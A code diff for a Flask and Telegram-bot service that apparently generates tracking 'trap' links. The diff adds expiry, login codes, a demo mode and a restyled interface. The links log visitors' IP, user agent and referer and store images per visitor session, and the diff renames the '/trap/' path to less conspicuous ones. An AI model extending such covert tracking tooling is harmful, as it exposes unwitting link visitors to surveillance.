@@ -56,6 +56,12 @@ bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
 NGROK_URL = "https://kimberly-refractometric-nonorthographically.ngrok-free.dev"  # Ваш фиксированный ngrok URL
 LOCAL_URL = "http://localhost:8080"
 db_lock = Lock()
+LINK_EXPIRY_HOURS = 24
+EXPIRED_LINK_CLEANUP_INTERVAL = 300
+DEMO_SESSION_MINUTES = 10
+LOGIN_CODE_EXPIRE_MINUTES = 10
+DEMO_LINK_EXPIRY_MINUTES = 10
+MOBILE_USER_AGENT_PATTERN = re.compile(r'android|iphone|ipod|ipad|blackberry|iemobile|opera mini|mobile', re.IGNORECASE)
 
 # ========== БАЗА ДАННЫХ ==========
 
@@ -133,6 +139,18 @@ def init_db():
                 FOREIGN KEY (user_id) REFERENCES users (user_id)
             )
         ''')
+
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS login_codes (
+                code TEXT PRIMARY KEY,
+                user_id INTEGER,
+                telegram_data TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                expires_at TIMESTAMP DEFAULT (datetime(CURRENT_TIMESTAMP, '+10 minutes')),
+                used BOOLEAN DEFAULT 0,
+                FOREIGN KEY (user_id) REFERENCES users (user_id)
+            )
+        ''')
         
         # Таблица изображений
         cursor.execute('''
@@ -150,6 +168,116 @@ def init_db():
         conn.commit()
         conn.close()
         print("✅ База данных инициализирована")
+
+def parse_db_timestamp(value):
+    """Безопасный парсер datetime из SQLite."""
+    if not value:
+        return None
+    if isinstance(value, datetime.datetime):
+        return value
+
+    normalized = str(value).replace('T', ' ')
+    try:
+        return datetime.datetime.fromisoformat(normalized)
+    except ValueError:
+        for fmt in ('%Y-%m-%d %H:%M:%S', '%Y-%m-%d %H:%M:%S.%f'):
+            try:
+                return datetime.datetime.strptime(normalized, fmt)
+            except ValueError:
+                continue
+    return None
+
+def is_mobile_request(req=None):
+    """Check whether request most likely comes from a phone browser."""
+    req = req or request
+    user_agent = ''
+    if req is not None:
+        user_agent = req.headers.get('User-Agent', '') or ''
+    return bool(MOBILE_USER_AGENT_PATTERN.search(user_agent))
+
+def is_link_expired(link):
+    """Проверяет, истекла ли ссылка по сроку жизни."""
+    expires_at = parse_db_timestamp(link.get('expires_at')) if link else None
+    return bool(expires_at and expires_at <= datetime.datetime.now())
+
+def collect_link_filenames(cursor, link_id):
+    """Получить имена файлов, связанных со ссылкой."""
+    cursor.execute('SELECT filename FROM images WHERE link_id = ?', (link_id,))
+    return [row[0] for row in cursor.fetchall() if row and row[0]]
+
+def remove_uploaded_files(filenames):
+    """Удаляет физические файлы изображений, если они существуют."""
+    for filename in filenames:
+        filepath = os.path.join(UPLOAD_FOLDER, filename)
+        try:
+            if os.path.exists(filepath):
+                os.remove(filepath)
+        except OSError as exc:
+            print(f"Ошибка удаления файла {filepath}: {exc}")
+
+def delete_link_records(cursor, link_id):
+    """Удаление данных ссылки в рамках одной транзакции."""
+    filenames = collect_link_filenames(cursor, link_id)
+    cursor.execute('DELETE FROM clicks WHERE link_id = ?', (link_id,))
+    cursor.execute('DELETE FROM images WHERE link_id = ?', (link_id,))
+    cursor.execute('DELETE FROM links WHERE link_id = ?', (link_id,))
+    return filenames
+
+def cleanup_expired_links(target_link_id=None):
+    """Удаляет просроченные ссылки и их файлы."""
+    removed_ids = []
+    files_to_remove = []
+
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+
+        if target_link_id:
+            cursor.execute(
+                'SELECT link_id FROM links WHERE link_id = ? AND expires_at <= CURRENT_TIMESTAMP',
+                (target_link_id,)
+            )
+        else:
+            cursor.execute('SELECT link_id FROM links WHERE expires_at <= CURRENT_TIMESTAMP')
+
+        expired_links = [row['link_id'] for row in cursor.fetchall()]
+
+        for link_id in expired_links:
+            files_to_remove.extend(delete_link_records(cursor, link_id))
+            removed_ids.append(link_id)
+
+        conn.commit()
+        conn.close()
+
+    if files_to_remove:
+        remove_uploaded_files(files_to_remove)
+
+    return removed_ids
+
+def cleanup_expired_sessions():
+    """Удаляет просроченные login/persistent сессии и токены."""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        cursor.execute('DELETE FROM login_sessions WHERE expires_at <= CURRENT_TIMESTAMP')
+        cursor.execute('DELETE FROM login_codes WHERE expires_at <= CURRENT_TIMESTAMP OR used = 1')
+        cursor.execute('DELETE FROM persistent_sessions WHERE expires_at <= CURRENT_TIMESTAMP')
+        cursor.execute(
+            'UPDATE users SET auth_token = NULL, auth_token_expires = NULL WHERE auth_token_expires <= CURRENT_TIMESTAMP'
+        )
+        conn.commit()
+        conn.close()
+
+def background_cleanup_worker():
+    """Фоновая очистка базы и uploads."""
+    while True:
+        try:
+            cleanup_expired_links()
+            cleanup_expired_sessions()
+        except Exception as exc:
+            print(f"Ошибка фоновой очистки: {exc}")
+        time.sleep(EXPIRED_LINK_CLEANUP_INTERVAL)
 
 def get_user_by_chat_id(chat_id):
     """Получить пользователя по chat_id"""
@@ -293,38 +421,48 @@ def delete_persistent_session(session_id):
         conn.commit()
         conn.close()
 
-def create_link(user_id, link_id, name, redirect_url):
+def create_link(user_id, link_id, name, redirect_url, expires_minutes=None):
+    expires_expression = f'+{expires_minutes} minutes' if expires_minutes is not None else f'+{LINK_EXPIRY_HOURS} hours'
     """Создать ссылку"""
     with db_lock:
         conn = sqlite3.connect(DB_FILE)
         cursor = conn.cursor()
         
         cursor.execute('''
-            INSERT INTO links (link_id, user_id, name, redirect_url)
-            VALUES (?, ?, ?, ?)
-        ''', (link_id, user_id, name, redirect_url))
+            INSERT INTO links (link_id, user_id, name, redirect_url, expires_at)
+            VALUES (?, ?, ?, ?, datetime(CURRENT_TIMESTAMP, ?))
+        ''', (link_id, user_id, name, redirect_url, expires_expression))
         
         conn.commit()
         conn.close()
 
 def get_user_links(user_id):
+    cleanup_expired_links()
     """Получить все ссылки пользователя"""
     with db_lock:
         conn = sqlite3.connect(DB_FILE)
         conn.row_factory = sqlite3.Row
         cursor = conn.cursor()
-        cursor.execute('SELECT * FROM links WHERE user_id = ? ORDER BY created_at DESC', (user_id,))
+        cursor.execute('''
+            SELECT * FROM links
+            WHERE user_id = ? AND active = 1 AND expires_at > CURRENT_TIMESTAMP
+            ORDER BY created_at DESC
+        ''', (user_id,))
         links = cursor.fetchall()
         conn.close()
         return [dict(link) for link in links]
 
 def get_link(link_id):
+    cleanup_expired_links(target_link_id=link_id)
     """Получить ссылку по ID"""
     with db_lock:
         conn = sqlite3.connect(DB_FILE)
         conn.row_factory = sqlite3.Row
         cursor = conn.cursor()
-        cursor.execute('SELECT * FROM links WHERE link_id = ?', (link_id,))
+        cursor.execute('''
+            SELECT * FROM links
+            WHERE link_id = ? AND active = 1 AND expires_at > CURRENT_TIMESTAMP
+        ''', (link_id,))
         link = cursor.fetchone()
         conn.close()
         return dict(link) if link else None
@@ -348,6 +486,7 @@ def increment_clicks(link_id, ip, user_agent, referer):
         conn.close()
 
 def delete_link(user_id, link_id):
+    files_to_remove = []
     """Удалить ссылку"""
     with db_lock:
         conn = sqlite3.connect(DB_FILE)
@@ -358,15 +497,15 @@ def delete_link(user_id, link_id):
         link = cursor.fetchone()
         
         if link and link[0] == user_id:
-            cursor.execute('DELETE FROM links WHERE link_id = ?', (link_id,))
-            cursor.execute('DELETE FROM clicks WHERE link_id = ?', (link_id,))
-            cursor.execute('DELETE FROM images WHERE link_id = ?', (link_id,))
+            files_to_remove = delete_link_records(cursor, link_id)
             conn.commit()
             success = True
         else:
             success = False
         
         conn.close()
+        if files_to_remove:
+            remove_uploaded_files(files_to_remove)
         return success
 
 def create_session(user_id, telegram_data):
@@ -421,6 +560,114 @@ def delete_login_session(session_id):
         conn.commit()
         conn.close()
 
+def generate_login_code():
+    """Генерирует короткий код для входа."""
+    alphabet = "23456789ABCDEFGHJKLMNPQRSTUVWXYZ"
+    return ''.join(secrets.choice(alphabet) for _ in range(6))
+
+def create_login_code(user_id, telegram_data):
+    """Создать одноразовый код входа."""
+    code = generate_login_code()
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        cursor.execute('DELETE FROM login_codes WHERE user_id = ? OR expires_at <= CURRENT_TIMESTAMP', (user_id,))
+        cursor.execute('''
+            INSERT INTO login_codes (code, user_id, telegram_data, expires_at)
+            VALUES (?, ?, ?, datetime(CURRENT_TIMESTAMP, ?))
+        ''', (code, user_id, json.dumps(telegram_data), f'+{LOGIN_CODE_EXPIRE_MINUTES} minutes'))
+        conn.commit()
+        conn.close()
+    return code
+
+def get_login_code(code):
+    """Получить код входа."""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        cursor.execute('''
+            SELECT * FROM login_codes
+            WHERE code = ? AND used = 0 AND expires_at > CURRENT_TIMESTAMP
+        ''', (code.upper(),))
+        result = cursor.fetchone()
+        conn.close()
+        return dict(result) if result else None
+
+def mark_login_code_used(code):
+    """Пометить код входа использованным."""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        cursor.execute('UPDATE login_codes SET used = 1 WHERE code = ?', (code.upper(),))
+        conn.commit()
+        conn.close()
+
+def create_demo_user():
+    """Создает временного демо-пользователя."""
+    demo_name = f"demo_{secrets.token_hex(4)}"
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        cursor.execute('''
+            INSERT INTO users (chat_id, username, first_name, last_name, last_login)
+            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
+        ''', (None, demo_name, 'Demo', 'Mode'))
+        user_id = cursor.lastrowid
+        conn.commit()
+        conn.close()
+    return user_id
+
+def delete_user_links(user_id):
+    """Удаляет все ссылки пользователя и связанные файлы."""
+    files_to_remove = []
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        cursor.execute('SELECT link_id FROM links WHERE user_id = ?', (user_id,))
+        for row in cursor.fetchall():
+            files_to_remove.extend(delete_link_records(cursor, row['link_id']))
+        conn.commit()
+        conn.close()
+    if files_to_remove:
+        remove_uploaded_files(files_to_remove)
+
+def clear_demo_session():
+    """Очищает демо-пользователя и его ссылки."""
+    demo_user_id = session.get('user_id')
+    if demo_user_id:
+        delete_user_links(demo_user_id)
+        with db_lock:
+            conn = sqlite3.connect(DB_FILE)
+            cursor = conn.cursor()
+            cursor.execute('DELETE FROM users WHERE user_id = ? AND username LIKE "demo_%"', (demo_user_id,))
+            conn.commit()
+            conn.close()
+    session.clear()
+
+def is_demo_session_expired():
+    """Проверяет срок жизни ознакомительного режима."""
+    if not session.get('demo_mode'):
+        return False
+    expires_at = parse_db_timestamp(session.get('demo_expires_at'))
+    return bool(expires_at and expires_at <= datetime.datetime.now())
+
+def activate_demo_session():
+    """Запускает ознакомительный режим на 10 минут."""
+    user_id = create_demo_user()
+    expires_at = datetime.datetime.now() + datetime.timedelta(minutes=DEMO_SESSION_MINUTES)
+    session.clear()
+    session['user_id'] = user_id
+    session['chat_id'] = None
+    session['username'] = f"demo_{user_id}"
+    session['first_name'] = 'Demo'
+    session['last_name'] = 'Mode'
+    session['demo_mode'] = True
+    session['demo_expires_at'] = expires_at.isoformat()
+    session.permanent = False
+    return expires_at
+
 def save_image_info(link_id, image_type, session_id, filename):
     """Сохранить информацию об изображении"""
     with db_lock:
@@ -442,6 +689,11 @@ def login_required(f):
     @wraps(f)
     def decorated_function(*args, **kwargs):
         # Проверяем Flask сессию
+        if is_demo_session_expired():
+            clear_demo_session()
+            if request.path.startswith('/api/'):
+                return jsonify({'success': False, 'error': 'Demo session expired', 'demo_expired': True}), 401
+            return redirect(url_for('login_page'))
         if 'user_id' in session:
             return f(*args, **kwargs)
         
@@ -491,6 +743,8 @@ def login_required(f):
                 return response
         
         # Не авторизован
+        if request.path.startswith('/api/'):
+            return jsonify({'success': False, 'error': 'Authentication required'}), 401
         return redirect(url_for('login_page'))
     
     return decorated_function
@@ -534,58 +788,66 @@ LOGIN_HTML = """<!DOCTYPE html>
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Trebuchet MS', 'Segoe UI', sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background:
+                radial-gradient(circle at top left, rgba(65, 184, 255, 0.28), transparent 24%),
+                radial-gradient(circle at bottom right, rgba(81, 255, 191, 0.16), transparent 20%),
+                linear-gradient(145deg, #020816 0%, #0b1830 46%, #112744 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            padding: 24px;
         }
         
         .container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            max-width: 500px;
+            background: rgba(255, 255, 255, 0.96);
+            border-radius: 28px;
+            padding: 44px;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.35);
+            max-width: 560px;
             width: 100%;
             text-align: center;
+            border: 1px solid rgba(255,255,255,0.55);
+            backdrop-filter: blur(16px);
         }
         
         h1 {
-            color: #333;
+            color: #13263d;
             margin-bottom: 20px;
-            font-size: 2em;
+            font-size: 2.4em;
+            line-height: 1.05;
         }
         
         .subtitle {
-            color: #666;
+            color: #5f7187;
             margin-bottom: 30px;
-            line-height: 1.5;
+            line-height: 1.7;
+            font-size: 16px;
         }
         
         .telegram-btn {
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            background: #0088cc;
+            background: linear-gradient(135deg, #0ea5e9, #36c6f4);
             color: white;
             text-decoration: none;
-            padding: 15px 30px;
-            border-radius: 10px;
+            padding: 16px 30px;
+            border-radius: 16px;
             font-size: 18px;
             font-weight: 600;
             transition: transform 0.2s, box-shadow 0.2s;
             margin: 20px 0;
+            box-shadow: 0 18px 28px rgba(14, 165, 233, 0.28);
         }
         
         .telegram-btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0, 136, 204, 0.4);
+            box-shadow: 0 22px 34px rgba(14, 165, 233, 0.34);
         }
         
         .telegram-btn img {
@@ -595,11 +857,12 @@ LOGIN_HTML = """<!DOCTYPE html>
         }
         
         .info-box {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 20px;
+            background: linear-gradient(180deg, #f6fbff, #eef5fb);
+            border-radius: 18px;
+            padding: 22px;
             margin-top: 30px;
             text-align: left;
+            border: 1px solid rgba(14, 165, 233, 0.12);
         }
         
         .info-box h3 {
@@ -618,10 +881,11 @@ LOGIN_HTML = """<!DOCTYPE html>
         
         .qr-container {
             margin: 30px 0;
-            padding: 20px;
+            padding: 22px;
             background: white;
-            border-radius: 10px;
-            border: 1px solid #e0e0e0;
+            border-radius: 18px;
+            border: 1px solid rgba(16, 46, 80, 0.12);
+            box-shadow: inset 0 1px 0 rgba(255,255,255,0.6);
         }
         
         .qr-code {
@@ -637,7 +901,7 @@ LOGIN_HTML = """<!DOCTYPE html>
         .status {
             margin-top: 20px;
             padding: 15px;
-            border-radius: 10px;
+            border-radius: 16px;
             background: #d4edda;
             color: #155724;
             display: none;
@@ -656,14 +920,71 @@ LOGIN_HTML = """<!DOCTYPE html>
         .auto-login {
             margin-top: 20px;
             padding: 15px;
-            border-radius: 10px;
-            background: #fff3cd;
-            color: #856404;
+            border-radius: 16px;
+            background: #fff7db;
+            color: #7b5e17;
             font-size: 14px;
         }
         
         .auto-login input {
             margin-right: 10px;
+        }
+
+        .code-login {
+            margin-top: 18px;
+            padding: 18px;
+            border-radius: 18px;
+            background: #f6fbff;
+            border: 1px solid rgba(14, 165, 233, 0.12);
+            text-align: left;
+        }
+
+        .code-login h3 {
+            margin-bottom: 12px;
+            color: #13263d;
+        }
+
+        .code-login p {
+            color: #5f7187;
+            font-size: 14px;
+            line-height: 1.55;
+            margin-bottom: 12px;
+        }
+
+        .code-row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .code-row input {
+            flex: 1;
+            padding: 14px 16px;
+            border-radius: 14px;
+            border: 1px solid rgba(16, 46, 80, 0.12);
+            font-size: 16px;
+            text-transform: uppercase;
+        }
+
+        .secondary-btn {
+            border: none;
+            border-radius: 14px;
+            padding: 14px 18px;
+            cursor: pointer;
+            font-weight: 600;
+            color: #0f3d63;
+            background: #e8f3fb;
+        }
+
+        .demo-btn {
+            width: 100%;
+            margin-top: 14px;
+            border: none;
+            border-radius: 16px;
+            padding: 15px 20px;
+            cursor: pointer;
+            font-weight: 700;
+            color: #13263d;
+            background: linear-gradient(135deg, #fef3c7, #fde68a);
         }
     </style>
 </head>
@@ -685,6 +1006,16 @@ LOGIN_HTML = """<!DOCTYPE html>
             <img src="https://telegram.org/img/t_logo.svg" alt="Telegram">
             Открыть Telegram бота
         </a>
+
+        <div class="code-login">
+            <h3>Вход по коду</h3>
+            <p>В боте выберите «Войти на сайт», затем способ «по коду». Код действует {{ login_code_minutes }} минут.</p>
+            <div class="code-row">
+                <input type="text" id="loginCode" maxlength="6" placeholder="Введите код">
+                <button type="button" class="secondary-btn" onclick="loginWithCode()">Войти</button>
+            </div>
+            <button type="button" class="demo-btn" onclick="startDemoMode()">Ознакомительный режим на {{ demo_minutes }} минут</button>
+        </div>
         
         <p style="margin: 20px 0; color: #666;">Или отсканируйте QR-код:</p>
         
@@ -713,6 +1044,13 @@ LOGIN_HTML = """<!DOCTYPE html>
     </div>
     
     <script>
+        function showStatus(message, type = 'info') {
+            const statusEl = document.getElementById('status');
+            statusEl.textContent = message;
+            statusEl.className = 'status ' + type;
+            statusEl.style.display = 'block';
+        }
+
         // Проверка авторизации каждые 3 секунды
         function checkAuth() {
             fetch('/api/check-auth')
@@ -722,8 +1060,12 @@ LOGIN_HTML = """<!DOCTYPE html>
                 })
                 .then(data => {
                     const statusEl = document.getElementById('status');
+                    if (data.demo_expired) {
+                        showStatus('Ознакомительный режим завершен. Войдите снова.', 'error');
+                        return;
+                    }
                     if (data.authenticated) {
-                        statusEl.textContent = '✅ Авторизация успешна!';
+                        statusEl.textContent = data.demo_mode ? '✅ Демо-режим активирован!' : '✅ Авторизация успешна!';
                         statusEl.className = 'status';
                         statusEl.style.display = 'block';
                         
@@ -758,6 +1100,43 @@ LOGIN_HTML = """<!DOCTYPE html>
                 document.getElementById('rememberMe').checked = rememberMe === 'true';
             }
         }
+
+        async function loginWithCode() {
+            const code = document.getElementById('loginCode').value.trim().toUpperCase();
+            if (!code) {
+                showStatus('Введите код из Telegram-бота.', 'error');
+                return;
+            }
+
+            try {
+                const response = await fetch('/api/login-with-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ code })
+                });
+                const data = await response.json();
+                if (!response.ok || !data.success) throw new Error(data.error || 'login');
+                showStatus('Код подтвержден. Перенаправляем...', 'success');
+                setTimeout(() => window.location.href = data.redirect_url || '/', 700);
+            } catch (error) {
+                showStatus(error.message || 'Не удалось выполнить вход по коду.', 'error');
+            }
+        }
+
+        async function startDemoMode() {
+            try {
+                const response = await fetch('/api/start-demo', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+                const data = await response.json();
+                if (!response.ok || !data.success) throw new Error(data.error || 'demo');
+                showStatus('Ознакомительный режим активирован на {{ demo_minutes }} минут.', 'info');
+                setTimeout(() => window.location.href = data.redirect_url || '/', 700);
+            } catch (error) {
+                showStatus(error.message || 'Не удалось запустить ознакомительный режим.', 'error');
+            }
+        }
         
         // Запускаем проверку при загрузке и каждые 3 секунды
         document.addEventListener('DOMContentLoaded', () => {
@@ -780,24 +1159,29 @@ GENERATOR_HTML = """<!DOCTYPE html>
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Trebuchet MS', 'Segoe UI', sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background:
+                radial-gradient(circle at top left, rgba(14, 165, 233, 0.16), transparent 24%),
+                radial-gradient(circle at top right, rgba(16, 185, 129, 0.12), transparent 18%),
+                linear-gradient(180deg, #f3f7fb 0%, #eaf2f9 48%, #dce7f3 100%);
             min-height: 100vh;
             padding: 20px;
         }
         
         .header {
-            background: white;
-            border-radius: 15px;
-            padding: 20px;
+            background: rgba(255,255,255,0.82);
+            border-radius: 24px;
+            padding: 22px 24px;
             margin-bottom: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            box-shadow: 0 20px 50px rgba(15, 38, 63, 0.12);
             display: flex;
             justify-content: space-between;
             align-items: center;
+            border: 1px solid rgba(255,255,255,0.7);
+            backdrop-filter: blur(12px);
         }
         
         .user-info {
@@ -809,8 +1193,8 @@ GENERATOR_HTML = """<!DOCTYPE html>
         .avatar {
             width: 50px;
             height: 50px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 50%;
+            background: linear-gradient(135deg, #0284c7 0%, #14b8a6 100%);
+            border-radius: 16px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -830,41 +1214,46 @@ GENERATOR_HTML = """<!DOCTYPE html>
         }
         
         .logout-btn {
-            background: #dc3545;
+            background: linear-gradient(135deg, #ef4444, #b91c1c);
             color: white;
             border: none;
-            padding: 10px 20px;
-            border-radius: 8px;
+            padding: 11px 18px;
+            border-radius: 14px;
             cursor: pointer;
             font-weight: 600;
-            transition: background 0.3s;
+            transition: transform 0.2s, box-shadow 0.2s;
         }
         
         .logout-btn:hover {
-            background: #c82333;
+            transform: translateY(-1px);
+            box-shadow: 0 14px 24px rgba(185, 28, 28, 0.18);
         }
         
         .container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            max-width: 1000px;
+            background: rgba(255,255,255,0.9);
+            border-radius: 28px;
+            padding: 42px;
+            box-shadow: 0 24px 70px rgba(15, 38, 63, 0.14);
+            max-width: 1100px;
             margin: 0 auto;
+            border: 1px solid rgba(255,255,255,0.7);
+            backdrop-filter: blur(10px);
         }
         
         h1 {
-            color: #333;
+            color: #10263d;
             margin-bottom: 10px;
             text-align: center;
             font-size: 2.5em;
+            line-height: 1.08;
         }
         
         .subtitle {
-            color: #666;
+            color: #62738a;
             text-align: center;
             margin-bottom: 40px;
             font-size: 1.1em;
+            line-height: 1.6;
         }
         
         .form-group {
@@ -881,23 +1270,25 @@ GENERATOR_HTML = """<!DOCTYPE html>
         input[type="text"] {
             width: 100%;
             padding: 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
+            border: 1px solid rgba(16, 46, 80, 0.12);
+            border-radius: 16px;
             font-size: 16px;
-            transition: border 0.3s;
+            transition: border 0.3s, box-shadow 0.3s;
+            background: rgba(255,255,255,0.86);
         }
         
         input[type="text"]:focus {
             outline: none;
-            border-color: #667eea;
+            border-color: #0ea5e9;
+            box-shadow: 0 0 0 4px rgba(14, 165, 233, 0.12);
         }
         
         .btn {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #0ea5e9 0%, #0369a1 100%);
             color: white;
             border: none;
             padding: 15px 30px;
-            border-radius: 10px;
+            border-radius: 16px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
@@ -909,15 +1300,16 @@ GENERATOR_HTML = """<!DOCTYPE html>
         
         .btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+            box-shadow: 0 18px 30px rgba(14, 165, 233, 0.22);
         }
         
         .link-result {
             margin-top: 30px;
-            padding: 20px;
-            background: #f8f9fa;
-            border-radius: 10px;
+            padding: 24px;
+            background: linear-gradient(180deg, rgba(14, 165, 233, 0.06), rgba(14, 165, 233, 0.02));
+            border-radius: 20px;
             display: none;
+            border: 1px solid rgba(14, 165, 233, 0.12);
         }
         
         .link-result.active {
@@ -939,26 +1331,26 @@ GENERATOR_HTML = """<!DOCTYPE html>
         .link-input {
             flex: 1;
             padding: 12px;
-            border: 2px solid #e0e0e0;
-            border-radius: 8px;
+            border: 1px solid rgba(16, 46, 80, 0.12);
+            border-radius: 14px;
             background: white;
             font-size: 14px;
             word-break: break-all;
         }
         
         .copy-btn {
-            background: #28a745;
+            background: linear-gradient(135deg, #10b981, #0f9f74);
             color: white;
             border: none;
             padding: 12px 20px;
-            border-radius: 8px;
+            border-radius: 14px;
             cursor: pointer;
             font-weight: 600;
             white-space: nowrap;
         }
         
         .copy-btn:hover {
-            background: #218838;
+            box-shadow: 0 14px 24px rgba(15, 159, 116, 0.18);
         }
         
         .stats {
@@ -969,16 +1361,17 @@ GENERATOR_HTML = """<!DOCTYPE html>
         }
         
         .stat-box {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 10px;
+            background: rgba(255,255,255,0.72);
+            padding: 22px;
+            border-radius: 20px;
             text-align: center;
+            border: 1px solid rgba(255,255,255,0.7);
         }
         
         .stat-number {
             font-size: 2em;
             font-weight: bold;
-            color: #667eea;
+            color: #0f3d63;
             margin-bottom: 5px;
         }
         
@@ -992,13 +1385,15 @@ GENERATOR_HTML = """<!DOCTYPE html>
         }
         
         .link-item {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 10px;
+            background: rgba(255,255,255,0.76);
+            padding: 18px;
+            border-radius: 18px;
+            margin-bottom: 12px;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            border: 1px solid rgba(255,255,255,0.72);
+            box-shadow: 0 14px 34px rgba(15, 38, 63, 0.08);
         }
         
         .link-info {
@@ -1008,12 +1403,13 @@ GENERATOR_HTML = """<!DOCTYPE html>
         
         .link-name {
             font-weight: 600;
-            color: #333;
+            color: #10263d;
             margin-bottom: 5px;
+            font-size: 18px;
         }
         
         .link-url {
-            color: #666;
+            color: #0369a1;
             font-size: 0.9em;
             word-break: break-all;
             margin-bottom: 5px;
@@ -1021,15 +1417,15 @@ GENERATOR_HTML = """<!DOCTYPE html>
         
         .link-stats {
             font-size: 0.8em;
-            color: #888;
+            color: #62738a;
         }
         
         .delete-btn {
-            background: #dc3545;
+            background: linear-gradient(135deg, #ef4444, #b91c1c);
             color: white;
             border: none;
             padding: 8px 15px;
-            border-radius: 6px;
+            border-radius: 12px;
             cursor: pointer;
             font-size: 0.9em;
             white-space: nowrap;
@@ -1044,33 +1440,33 @@ GENERATOR_HTML = """<!DOCTYPE html>
         }
         
         .btn-secondary {
-            background: #6c757d;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
+            background: #e9f2f9;
+            color: #10263d;
+            border: 1px solid rgba(16, 46, 80, 0.08);
+            padding: 11px 20px;
+            border-radius: 12px;
             cursor: pointer;
             font-size: 14px;
             flex: 1;
         }
         
         .btn-secondary:hover {
-            background: #5a6268;
+            background: #dcebf6;
         }
         
         .btn-success {
-            background: #28a745;
+            background: linear-gradient(135deg, #10b981, #0f9f74);
             color: white;
             border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
+            padding: 11px 20px;
+            border-radius: 12px;
             cursor: pointer;
             font-size: 14px;
             flex: 1;
         }
         
         .btn-success:hover {
-            background: #218838;
+            box-shadow: 0 14px 24px rgba(15, 159, 116, 0.18);
         }
         
         .qr-container {
@@ -1078,8 +1474,8 @@ GENERATOR_HTML = """<!DOCTYPE html>
             margin-top: 20px;
             padding: 20px;
             background: white;
-            border-radius: 10px;
-            border: 1px solid #e0e0e0;
+            border-radius: 18px;
+            border: 1px solid rgba(16, 46, 80, 0.12);
         }
         
         .qr-code {
@@ -1100,13 +1496,13 @@ GENERATOR_HTML = """<!DOCTYPE html>
         
         .notification {
             position: fixed;
-            top: 20px;
+            bottom: 20px;
             right: 20px;
             padding: 15px 25px;
-            border-radius: 10px;
-            background: #28a745;
+            border-radius: 16px;
+            background: linear-gradient(135deg, #10b981, #0f9f74);
             color: white;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            box-shadow: 0 20px 45px rgba(0,0,0,0.18);
             z-index: 1000;
             display: none;
             animation: slideIn 0.3s ease;
@@ -1129,6 +1525,22 @@ GENERATOR_HTML = """<!DOCTYPE html>
             font-size: 12px;
             color: #888;
             margin-top: 5px;
+        }
+        
+        @media (max-width: 900px) {
+            .header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .container {
+                padding: 28px;
+            }
+            .generated-link,
+            .btn-group,
+            .link-item {
+                flex-direction: column;
+                align-items: stretch;
+            }
         }
     </style>
 </head>
@@ -1221,6 +1633,7 @@ GENERATOR_HTML = """<!DOCTYPE html>
         // Базовый URL
         const BASE_URL = '{{ base_url }}';
         let userData = {{ user_data|tojson }};
+        let currentGeneratedName = 'Без названия';
         
         // Обновление статистики пользователя
         function updateUserStats() {
@@ -1278,8 +1691,8 @@ GENERATOR_HTML = """<!DOCTYPE html>
                         const created = new Date(link.created_at).toLocaleDateString('ru-RU');
                         const expires = new Date(link.expires_at).toLocaleDateString('ru-RU');
                         const status = link.active ? '🟢 Активна' : '🔴 Истекла';
-                        const fullUrl = `${BASE_URL}/trap/${link.link_id}`;
-                        const shortUrl = `${BASE_URL}/s/${link.link_id}`;
+                        const fullUrl = `${BASE_URL}/red/${link.link_id}`;
+                        const shortUrl = `${BASE_URL}/r/${link.link_id}`;
                         
                         html += `
                             <div class="link-item">
@@ -1427,6 +1840,7 @@ GENERATOR_HTML = """<!DOCTYPE html>
                     const fullUrl = data.full_url;
                     const shortUrl = data.short_url;
                     
+                    currentGeneratedName = data.name || 'Без названия';
